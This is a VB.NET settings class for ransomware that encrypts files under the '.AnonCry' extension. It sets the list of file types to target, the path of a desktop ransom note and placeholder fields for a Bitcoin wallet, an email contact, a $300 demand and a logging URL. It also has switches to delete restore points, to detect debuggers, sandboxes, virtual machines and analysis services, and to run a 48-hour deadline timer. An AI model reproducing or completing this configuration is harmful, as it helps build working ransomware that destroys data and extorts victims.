﻿Public Class Class1

    Class Settings
        'options
        Public Shared hash As String
        Public Shared startup As Boolean = "True" 'startup
        Public Shared DeleteRestorePoints As Boolean = "True"
        Public Shared mute As String = "vYtzIm0SDgeCYX5eq8g7" 'mute

        Public Shared mExtesiones As IEnumerable(Of String) = {".js", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".cmd", ".bat", ".lnk", ".url", ".mat", ".kys", ".pif", ".scf", ".shs", ".shb", ".xnx", ".ps1", ".vbs", ".vb", ".pl", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".ta", ".pdf", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".docx", ".doc", ".htm,", ".html", ".php5", ".php", ".phtml", ".fla", ".cmd", ".ink", ".exe", ". txt", ".gif", ".csv", ".raw", ".lua", ".dat", ".vbs", ".vb6", ".apk", ".config", ".c", ".resx", ".vbproj", ".myapp", ".cache", ".pdb", ".manifest", ".png", ".bmp", ".eps", ".hdr", ".exr", ".ico", ".svg", ".tga", ".tiff", ".wbmp", ".webp"} ' Extesiones
        Public Shared exs As String = ".AnonCry" ' extension
        Public Shared html As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\Recover_Your_Files.html"

        Public Shared btc As String = "BitcoinWallet" ' your btc address
        Public Shared email As String = "emailmu@mail.com" ' your email
        Public Shared amount As String = "300" ' 300 $
        Public Shared logg As String = "https://yoursite.com/log.php"
        Public Shared maxrandom As Integer = 20
        Public Shared validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

        ' Anti Analysi
        Public Shared Emulator As Boolean = "True"
        Public Shared DetectDebugger As Boolean = "True"
        Public Shared DetectSandboxie As Boolean = "True"
        Public Shared DetectVirtualMachine As Boolean = "True"
        Public Shared anyrun As Boolean = "True"

        ' Time
        Public Shared Setting As String = "Runcount.cry"
        Public Shared H As Integer = 48
        Public Shared m As Integer = 00
        Public Shared Del As Object = GetSetting("D", "0", Class1.Settings.Setting)


        Public Shared Attempts As String = 6

    End Class
End Class
